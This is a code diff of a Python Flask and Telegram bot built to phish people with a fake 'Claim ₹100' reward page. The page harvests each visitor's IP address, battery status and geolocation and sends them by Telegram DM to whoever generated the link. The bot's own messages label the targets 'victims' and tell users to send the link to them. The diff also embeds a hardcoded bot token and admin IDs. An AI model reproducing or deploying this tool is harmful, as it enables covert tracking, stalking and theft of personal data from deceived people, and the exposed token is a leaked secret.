@@ -9,20 +9,18 @@ from datetime import datetime
 from flask import Flask, request, jsonify, render_template_string
 from telegram import Update
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
-import asyncio
 import threading
 import time
 
 # ======== CONFIG ========
 BOT_TOKEN = "8222470338:AAE5mR86BFGu1V9NwJok-N1yquxbmqtHVNI"
-ADMIN_ID = 8586849798
-APP_URL = os.environ.get("https://claim100rsfree-2.onrender.com", "https://your-app.onrender.com")
+ADMIN_ID = 8986441675
+APP_URL = os.environ.get("APP_URL", "https://your-app.onrender.com")
 PORT = int(os.environ.get("PORT", 5000))
 
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
-# ======== DATABASE ========
 DB_FILE = "botdata.json"
 
 def load_db():
@@ -43,10 +41,10 @@ def is_banned(uid):
     db = load_db()
     return str(uid) in db.get("banned", [])
 
-# ======== FLASK WEB ========
+# ======== FLASK ========
 app = Flask(__name__)
 
-CLAIM_HTML = """<!DOCTYPE html>
+CLAIM_PAGE = """<!DOCTYPE html>
 <html>
 <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
 <title>Claim Reward</title>
@@ -128,33 +126,33 @@ async function claim(){
 
 @app.route('/')
 def home():
-    return "✅ Bot is running", 200
+    return "✅ Bot is live", 200
 
 @app.route('/health')
 def health():
     return "OK", 200
 
 @app.route('/collect/<token>')
-def claim_page(token):
+def show_claim(token):
     db = load_db()
     if token not in db.get("tokens", {}):
-        return "❌ Invalid or expired link", 404
-    return render_template_string(CLAIM_HTML.replace("[TOKEN]", token))
+        return "❌ Link expired or invalid", 404
+    return render_template_string(CLAIM_PAGE.replace("[TOKEN]", token))
 
 @app.route('/collect/<token>', methods=['POST'])
-def collect_data(token):
+def receive_data(token):
     db = load_db()
     if token not in db.get("tokens", {}):
-        return jsonify({"success": False, "error": "Invalid or expired link"}), 404
+        return jsonify({"success": False, "error": "Invalid"}), 404
     
-    data = request.json
-    tok = db["tokens"].pop(token)
+    tok_info = db["tokens"].pop(token)
     save_db(db)
     
+    data = request.json
     entry = {
-        "uid": tok.get("user_id"),
-        "uname": tok.get("username"),
-        "fname": tok.get("first_name"),
+        "uid": tok_info.get("user_id"),
+        "uname": tok_info.get("username"),
+        "fname": tok_info.get("first_name"),
         "ip": data.get("ip", "N/A"),
         "battery": data.get("battery", "N/A"),
         "lat": data.get("lat"),
@@ -168,7 +166,7 @@ def collect_data(token):
     db["logs"].append(entry)
     save_db(db)
     
-    # Send notification to admin
+    # Send DM to admin with all data
     try:
         msg = f"🔔 <b>New Victim Data!</b>\n"
         msg += f"👤 {entry['fname']} (@{entry['uname']})\n"
@@ -193,11 +191,11 @@ def collect_data(token):
             except:
                 pass
     except Exception as e:
-        logger.error(f"Notification error: {e}")
+        logger.error(f"DM send error: {e}")
     
     return jsonify({"success": True})
 
-# ======== TELEGRAM BOT HANDLERS ========
+# ======== BOT HANDLERS ========
 async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     u = update.effective_user
     db = load_db()
@@ -206,32 +204,29 @@ async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Access Denied. Contact @iflexvenom")
         return
     if not db.get("bot_on", True):
-        await update.message.reply_text("❌ Bot is currently disabled. Contact @iflexvenom")
+        await update.message.reply_text("❌ Bot Off. Contact @iflexvenom")
         return
     
-    # Register user
     if str(u.id) not in [x["id"] for x in db["users"]]:
         db["users"].append({"id": str(u.id), "uname": u.username, "fname": u.first_name, "joined": str(update.message.date)})
         save_db(db)
-        # Notify admin about new user
         if str(u.id) != str(ADMIN_ID):
             try:
                 requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
-                    "chat_id": ADMIN_ID, "text": f"🆕 New user started bot: {u.first_name} (@{u.username}) [ID: {u.id}]"
+                    "chat_id": ADMIN_ID, "text": f"🆕 New User: {u.first_name} (@{u.username}) [ID: {u.id}]"
                 })
             except:
                 pass
     
     welcome = f"👋 Welcome {u.first_name}!\n\n"
-    welcome += "Send me any link (http/https). I'll generate a reward claim link.\n"
-    welcome += "When victim opens the link and taps 'Claim ₹100', you'll get their data in DM."
+    welcome += "Send me any link. I'll give you a claim link.\n"
+    welcome += "Victim taps 'Claim ₹100' → You get their data in DM."
     
     await update.message.reply_text(welcome)
-    
     if is_admin(u.id):
-        await update.message.reply_text("✅ You are an admin! Use /help for admin commands.")
+        await update.message.reply_text("✅ Admin mode. Use /help")
 
-async def handle_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+async def handle_msg(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     u = update.effective_user
     db = load_db()
     
@@ -239,199 +234,136 @@ async def handle_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Access Denied. Contact @iflexvenom")
         return
     if not db.get("bot_on", True):
-        await update.message.reply_text("❌ Bot is currently disabled. Contact @iflexvenom")
+        await update.message.reply_text("❌ Bot Off. Contact @iflexvenom")
         return
     
     text = update.message.text.strip()
     
-    # Handle admin commands
+    # ---- Admin Commands ----
     if is_admin(u.id) and text.startswith("/"):
         args = text.split()
         cmd = args[0].lower()
         
         if cmd == "/help":
-            h = """<b>🔐 Admin Commands:</b>
-            
-/approve [user_id] - Add admin
-/unapprove [user_id] - Remove admin
-/ban [user_id] - Ban a user
-/unban [user_id] - Unban a user
-/users - Show all registered users
-/stats - Show bot statistics
-/logs - Show recent victim logs
-/on - Enable bot
-/off - Disable bot
-/clear - Clear all logs
-/help - Show this message"""
+            h = """<b>Admin Commands:</b>
+/approve [id] - Add admin
+/unapprove [id] - Remove admin
+/ban [id] - Ban user
+/unban [id] - Unban
+/users - List users
+/stats - Stats
+/logs - View logs
+/on - Bot ON
+/off - Bot OFF
+/clear - Clear logs"""
             await update.message.reply_text(h, parse_mode="HTML")
         
         elif cmd == "/approve":
-            if len(args) < 2:
-                await update.message.reply_text("Usage: /approve [user_id]")
-                return
+            if len(args) < 2: return await update.message.reply_text("Usage: /approve [id]")
             uid = args[1]
             db = load_db()
             if uid not in db["admins"]:
-                db["admins"].append(uid)
-                save_db(db)
-                await update.message.reply_text(f"✅ User {uid} is now an admin!")
-                try:
-                    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
-                        "chat_id": uid, "text": "✅ You have been approved as admin! Use /help for commands."
-                    })
-                except:
-                    pass
-            else:
-                await update.message.reply_text("Already an admin.")
+                db["admins"].append(uid); save_db(db)
+                await update.message.reply_text(f"✅ {uid} approved!")
+                try: requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": uid, "text": "✅ You're admin now! /help"})
+                except: pass
+            else: await update.message.reply_text("Already admin")
         
         elif cmd == "/unapprove":
-            if len(args) < 2:
-                await update.message.reply_text("Usage: /unapprove [user_id]")
-                return
+            if len(args) < 2: return await update.message.reply_text("Usage: /unapprove [id]")
             uid = args[1]
             db = load_db()
             if uid in db["admins"] and uid != str(ADMIN_ID):
-                db["admins"].remove(uid)
-                save_db(db)
-                await update.message.reply_text(f"❌ {uid} removed from admins.")
-            else:
-                await update.message.reply_text("Cannot remove main admin or user not an admin.")
+                db["admins"].remove(uid); save_db(db)
+                await update.message.reply_text(f"❌ {uid} removed")
+            else: await update.message.reply_text("Can't remove")
         
         elif cmd == "/ban":
-            if len(args) < 2:
-                await update.message.reply_text("Usage: /ban [user_id]")
-                return
+            if len(args) < 2: return await update.message.reply_text("Usage: /ban [id]")
             uid = args[1]
             db = load_db()
             if uid not in db.get("banned", []):
-                db.setdefault("banned", []).append(uid)
-                save_db(db)
-                await update.message.reply_text(f"⛔ User {uid} has been banned!")
+                db.setdefault("banned", []).append(uid); save_db(db)
+                await update.message.reply_text(f"⛔ {uid} banned!")
         
         elif cmd == "/unban":
-            if len(args) < 2:
-                await update.message.reply_text("Usage: /unban [user_id]")
-                return
+            if len(args) < 2: return await update.message.reply_text("Usage: /unban [id]")
             uid = args[1]
             db = load_db()
             if uid in db.get("banned", []):
-                db["banned"].remove(uid)
-                save_db(db)
-                await update.message.reply_text(f"✅ User {uid} has been unbanned!")
+                db["banned"].remove(uid); save_db(db)
+                await update.message.reply_text(f"✅ {uid} unbanned!")
         
         elif cmd == "/users":
             db = load_db()
-            users = db["users"]
-            if not users:
-                await update.message.reply_text("No users yet.")
-                return
-            msg = f"📊 <b>Total Users: {len(users)}</b>\n\n"
-            for x in users[-20:]:
+            us = db["users"]
+            if not us: return await update.message.reply_text("No users")
+            msg = f"📊 Users: {len(us)}\n"
+            for x in us[-20:]:
                 msg += f"🆔 {x['id']} | {x.get('fname','?')} | @{x.get('uname','?')}\n"
-            await update.message.reply_text(msg, parse_mode="HTML")
+            await update.message.reply_text(msg[:4000])
         
         elif cmd == "/stats":
             db = load_db()
-            msg = f"📊 <b>Bot Statistics</b>\n\n"
-            msg += f"👥 Total Users: {len(db['users'])}\n"
-            msg += f"📝 Total Logs: {len(db['logs'])}\n"
-            msg += f"🛡️ Admins: {len(db['admins'])}\n"
-            msg += f"⛔ Banned: {len(db.get('banned',[]))}\n"
-            msg += f"🔋 Bot Status: {'🟢 ON' if db.get('bot_on') else '🔴 OFF'}"
-            await update.message.reply_text(msg, parse_mode="HTML")
+            s = f"📊 Stats:\n👥 Users: {len(db['users'])}\n📝 Logs: {len(db['logs'])}\n🛡️ Admins: {len(db['admins'])}\n⛔ Banned: {len(db.get('banned',[]))}\n{'🟢 ON' if db.get('bot_on') else '🔴 OFF'}"
+            await update.message.reply_text(s)
         
         elif cmd == "/logs":
             db = load_db()
-            logs = db["logs"]
-            if not logs:
-                await update.message.reply_text("No logs yet.")
-                return
-            msg = f"📋 <b>Recent {min(10, len(logs))} of {len(logs)} Logs:</b>\n\n"
-            for l in logs[-10:]:
-                msg += f"👤 {l.get('fname','?')} (@{l.get('uname','?')})\n"
-                msg += f"🌐 IP: {l.get('ip','?')}\n"
-                msg += f"🔋 Battery: {l.get('battery','?')}\n"
+            logs = db["logs"][-10:]
+            if not logs: return await update.message.reply_text("No logs")
+            msg = f"📋 Last {len(logs)}:\n"
+            for l in logs:
+                msg += f"👤 {l.get('fname','?')} @{l.get('uname','?')}\n🌐 {l.get('ip','?')} 🔋 {l.get('battery','?')}\n"
                 if l.get('lat'): msg += f"📍 {l['lat']},{l['lon']}\n"
-                msg += f"🕐 {l.get('ts','?')[:19]}\n"
-                msg += "─────────────\n"
-            await update.message.reply_text(msg, parse_mode="HTML")
+                msg += "───\n"
+            await update.message.reply_text(msg[:4000])
         
         elif cmd == "/on":
-            db = load_db()
-            db["bot_on"] = True
-            save_db(db)
-            await update.message.reply_text("🟢 Bot is now <b>ON</b>", parse_mode="HTML")
+            db = load_db(); db["bot_on"] = True; save_db(db)
+            await update.message.reply_text("🟢 Bot ON")
         
         elif cmd == "/off":
-            db = load_db()
-            db["bot_on"] = False
-            save_db(db)
-            await update.message.reply_text("🔴 Bot is now <b>OFF</b>", parse_mode="HTML")
+            db = load_db(); db["bot_on"] = False; save_db(db)
+            await update.message.reply_text("🔴 Bot OFF")
         
         elif cmd == "/clear":
-            db = load_db()
-            db["logs"] = []
-            save_db(db)
-            await update.message.reply_text("🗑️ All logs cleared!")
+            db = load_db(); db["logs"] = []; save_db(db)
+            await update.message.reply_text("🗑️ Cleared!")
         
         return
     
-    # Non-admin: generate claim link
+    # ---- Link Generate (for everyone) ----
     if not text.startswith(("http://", "https://")):
-        await update.message.reply_text("❌ Please send a valid link starting with http:// or https://")
+        await update.message.reply_text("❌ Valid link bhejo (http/https)")
         return
     
     token = str(uuid.uuid4())[:8]
     claim_url = f"{APP_URL}/collect/{token}"
     
     db = load_db()
-    db["tokens"][token] = {
-        "user_id": str(u.id),
-        "username": u.username,
-        "first_name": u.first_name,
-        "original_link": text,
-        "created": str(update.message.date)
-    }
+    db["tokens"][token] = {"user_id": str(u.id), "username": u.username, "first_name": u.first_name, "link": text}
     save_db(db)
     
     await update.message.reply_text(
-        f"✅ <b>Claim Link Generated!</b>\n\n"
-        f"🔗 <code>{claim_url}</code>\n\n"
-        f"Send this to your target. When they tap and claim, their data will arrive in your DM.",
+        f"✅ Ready!\n🔗 <code>{claim_url}</code>\n\n"
+        f"Victim ko ye link bhejo. Woh 'Claim ₹100' dabayega → Data DM mein aayega.",
         parse_mode="HTML"
     )
 
-# ======== MAIN ========
-def run_flask():
-    """Run Flask on port 10000 (Render's default)"""
-    try:
-        app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False)
-    except Exception as e:
-        logger.error(f"Flask error: {e}")
+# ======== RUN ========
+def start_flask():
+    app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False)
 
-def run_telegram():
-    """Run Telegram bot with polling (more reliable on Render)"""
-    try:
-        application = Application.builder().token(BOT_TOKEN).build()
-        application.add_handler(CommandHandler("start", start))
-        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
-        
-        logger.info("Starting Telegram bot with polling...")
-        application.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
-    except Exception as e:
-        logger.error(f"Telegram bot error: {e}")
+def start_bot():
+    application = Application.builder().token(BOT_TOKEN).build()
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_msg))
+    application.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
 
 if __name__ == "__main__":
-    logger.info(f"Starting bot on port {PORT}")
-    logger.info(f"APP_URL: {APP_URL}")
-    logger.info(f"Admin ID: {ADMIN_ID}")
-    
-    # Start Flask in a thread
-    flask_thread = threading.Thread(target=run_flask, daemon=True)
-    flask_thread.start()
-    
-    # Small delay to ensure Flask starts first
-    time.sleep(1)
-    
-    # Run Telegram bot in main thread
-    run_telegram()
+    logger.info(f"Starting... PORT={PORT}, APP_URL={APP_URL}")
+    t = threading.Thread(target=start_flask, daemon=True)
+    t.start()
+    time.sleep(2)
+    start_bot()
